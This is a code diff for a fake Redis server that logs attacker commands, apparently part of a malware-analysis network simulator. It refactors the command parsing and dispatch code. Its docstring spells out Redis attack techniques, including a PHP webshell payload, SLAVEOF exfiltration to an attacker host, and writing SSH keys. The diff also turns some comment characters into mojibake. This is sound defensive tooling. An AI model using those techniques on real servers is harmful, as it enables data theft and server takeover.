@@ -3,21 +3,21 @@ NotTheNet - Fake Redis Server (TCP port 6379)
 
 Why this matters:
     Redis on an exposed port is heavily abused for:
-      - Cryptominer C2       — SLAVEOF <actor-ip> to exfiltrate the keyspace
-      - Webshell planting    — CONFIG SET dir /var/www + CONFIG SET dbfilename
+      - Cryptominer C2       â€” SLAVEOF <actor-ip> to exfiltrate the keyspace
+      - Webshell planting    â€” CONFIG SET dir /var/www + CONFIG SET dbfilename
                                shell.php + SET payload <?php system($_GET[e]); ?>
                                + SAVE to write a file to the web root
-      - Privilege escalation — write SSH authorized_keys via CONFIG SET dir
-      - DarkComet/NjRAT      — some variants use Redis as a C2 message queue
+      - Privilege escalation â€” write SSH authorized_keys via CONFIG SET dir
+      - DarkComet/NjRAT      â€” some variants use Redis as a C2 message queue
 
     This service responds to all common RESP commands and logs every command
     issued.  The SLAVEOF / REPLICAOF and CONFIG SET dir / dbfilename commands
     are explicitly flagged as high-interest in the log.
 
     RESP (Redis Serialization Protocol) is simple enough to parse inline:
-      *N\\r\\n — array of N elements
-      $N\\r\\n  — bulk string of N bytes
-      +string\\r\\n — simple string
+      *N\\r\\n â€” array of N elements
+      $N\\r\\n  â€” bulk string of N bytes
+      +string\\r\\n â€” simple string
       Inline commands: PING\\r\\n (legacy format)
 
 Security notes (OpenSSF):
@@ -31,7 +31,7 @@ Security notes (OpenSSF):
 import logging
 import socket
 import threading
-from typing import Optional
+from typing import Callable, Optional
 
 from utils.json_logger import get_json_logger
 from utils.logging_utils import sanitize_ip, sanitize_log_string
@@ -66,7 +66,7 @@ class _RedisSession(threading.Thread):
         self.addr = addr
         self._sem = sem
 
-    # ── RESP reader ──────────────────────────────────────────────────────────
+    # â”€â”€ RESP reader â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     def _readline(self) -> Optional[bytes]:
         """Read until \\r\\n (max 4 KB). Returns line without the terminator."""
@@ -81,6 +81,38 @@ class _RedisSession(threading.Thread):
             if buf.endswith(b"\r\n"):
                 return buf[:-2]
 
+    def _read_bulk_string(self) -> "str | None":
+        """Read one RESP bulk-string ($<len>\r\n<data>\r\n). Returns str or None."""
+        hdr = self._readline()
+        if hdr is None or not hdr.startswith(b"$"):
+            return None
+        try:
+            slen = int(hdr[1:])
+        except ValueError:
+            return None
+        if slen < 0 or slen > 65535:
+            return None
+        data = b""
+        while len(data) < slen + 2:
+            chunk = self.conn.recv(slen + 2 - len(data))
+            if not chunk:
+                return None
+            data += chunk
+        return data[:slen].decode("utf-8", errors="replace")
+
+    def _read_resp_array(self, n: int) -> "list[str] | None":
+        """Read *n* RESP bulk-string elements. Returns list or None on error."""
+        parts: list[str] = []
+        total_bytes = 0
+        for _ in range(n):
+            elem = self._read_bulk_string()
+            if elem is None:
+                return None
+            total_bytes += len(elem)
+            if total_bytes > 1024 * 1024:
+                return None
+            parts.append(elem)
+        return parts
     def _read_command(self) -> Optional[list[str]]:
         """
         Parse one RESP command.  Returns a list of strings (the command and
@@ -93,42 +125,18 @@ class _RedisSession(threading.Thread):
             return []
 
         if line[:1] == b"*":
-            # Array format
             try:
                 n = int(line[1:])
             except ValueError:
                 return None
             if n <= 0 or n > 256:
                 return None
-            parts: list[str] = []
-            total_bytes = 0
-            for _ in range(n):
-                hdr = self._readline()
-                if hdr is None or not hdr.startswith(b"$"):
-                    return None
-                try:
-                    slen = int(hdr[1:])
-                except ValueError:
-                    return None
-                if slen < 0 or slen > 65535:
-                    return None
-                total_bytes += slen
-                if total_bytes > 1024 * 1024:  # 1 MB total args cap
-                    return None
-                # Read exactly slen bytes + CRLF
-                data = b""
-                while len(data) < slen + 2:
-                    chunk = self.conn.recv(slen + 2 - len(data))
-                    if not chunk:
-                        return None
-                    data += chunk
-                parts.append(data[:slen].decode("utf-8", errors="replace"))
-            return parts
+            return self._read_resp_array(n)
 
         # Inline command (legacy, e.g. PING\r\n)
         return line.decode("utf-8", errors="replace").split()
 
-    # ── RESP response helpers ─────────────────────────────────────────────────
+    # â”€â”€ RESP response helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     def _send(self, data: bytes):
         try:
@@ -148,9 +156,64 @@ class _RedisSession(threading.Thread):
     def _error(self, msg: str):
         self._send(f"-ERR {msg}\r\n".encode())
 
-    # ── Session main ─────────────────────────────────────────────────────────
+    def _cmd_ping(self, args: list[str]) -> bool:
+        self._bulk(args[0]) if args else self._pong()
+        return True
 
-    def run(self):
+    def _cmd_info(self, _args: list[str]) -> bool:
+        self._bulk(_INFO_BODY)
+        return True
+
+    def _cmd_config(self, args: list[str]) -> bool:
+        sub = args[0].upper() if args else ""
+        if sub == "GET":
+            self._empty_array()
+        else:
+            self._ok()
+        return True
+
+    def _cmd_quit(self, _args: list[str]) -> bool:
+        self._ok()
+        return False  # signal close
+
+    # Commands that return +OK
+    _OK_CMDS = frozenset([
+        "SET", "MSET", "SETEX", "PSETEX", "SETNX",
+        "LPUSH", "RPUSH", "SADD", "ZADD", "HSET",
+        "SLAVEOF", "REPLICAOF", "SAVE", "BGSAVE",
+        "BGREWRITEAOF", "FLUSHALL", "FLUSHDB",
+        "DEBUG", "SHUTDOWN", "AUTH", "CLIENT", "SELECT",
+    ])
+    # Commands that return $-1 (nil)
+    _NIL_CMDS = frozenset(["GET", "MGET", "HGET", "LRANGE", "SMEMBERS"])
+    # Commands that return *0 (empty array)
+    _ARRAY_CMDS = frozenset(["COMMAND"])
+
+    _CMD_DISPATCH: "dict[str, Callable]" = {
+        "PING": _cmd_ping,
+        "INFO": _cmd_info,
+        "CONFIG": _cmd_config,
+        "QUIT": _cmd_quit,
+    }
+
+    def _dispatch_command(self, cmd: str, args: list[str]) -> bool:
+        """Handle one Redis command. Returns False to close the connection."""
+        handler = self._CMD_DISPATCH.get(cmd)
+        if handler:
+            return handler(self, args)  # type: ignore[operator]
+        if cmd in self._OK_CMDS:
+            self._ok()
+        elif cmd in self._NIL_CMDS:
+            self._nil()
+        elif cmd in self._ARRAY_CMDS:
+            self._empty_array()
+        else:
+            self._error(f"unknown command '{cmd}'")
+        return True
+
+    # â”€â”€ Session main â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+
+    def run(self) -> None:
         safe_addr = sanitize_ip(self.addr[0])
         jl = get_json_logger()
         logger.info("Redis connect from %s", safe_addr)
@@ -182,44 +245,12 @@ class _RedisSession(threading.Thread):
                         args=[sanitize_log_string(a[:100]) for a in args[:8]],
                     )
 
-                # ── Respond to common commands ────────────────────────────
-                if cmd == "PING":
-                    if args:
-                        self._bulk(args[0])
-                    else:
-                        self._pong()
-                elif cmd == "INFO":
-                    self._bulk(_INFO_BODY)
-                elif cmd in ("SET", "MSET", "SETEX", "PSETEX", "SETNX",
-                             "LPUSH", "RPUSH", "SADD", "ZADD", "HSET"):
-                    self._ok()
-                elif cmd in ("GET", "MGET", "HGET", "LRANGE", "SMEMBERS"):
-                    self._nil()
-                elif cmd == "CONFIG":
-                    if args and args[0].upper() == "SET":
-                        self._ok()
-                    elif args and args[0].upper() == "GET":
-                        self._empty_array()
-                    else:
-                        self._ok()
-                elif cmd in ("SLAVEOF", "REPLICAOF", "SAVE", "BGSAVE",
-                             "BGREWRITEAOF", "FLUSHALL", "FLUSHDB",
-                             "DEBUG", "SHUTDOWN", "AUTH"):
-                    self._ok()
-                elif cmd in ("CLIENT",):
-                    self._ok()
-                elif cmd == "COMMAND":
-                    self._empty_array()
-                elif cmd == "QUIT":
-                    self._ok()
+                # Respond to command
+                if not self._dispatch_command(cmd, args):
                     break
-                elif cmd == "SELECT":
-                    self._ok()
-                else:
-                    self._error(f"unknown command '{cmd}'")
 
         except OSError:
-            pass
+            logger.debug("Redis session error", exc_info=True)
         finally:
             try:
                 self.conn.close()
@@ -261,7 +292,8 @@ class RedisService:
             logger.error("Redis failed to bind on port %s: %s", self.port, e)
             return False
 
-    def _serve(self):
+    def _serve(self) -> None:
+        assert self._sock is not None
         while not self._stop.is_set():
             try:
                 conn, addr = self._sock.accept()
@@ -275,7 +307,7 @@ class RedisService:
                 continue
             _RedisSession(conn, addr, sem=self._sem).start()
 
-    def stop(self):
+    def stop(self) -> None:
         self._stop.set()
         if self._sock:
             try:
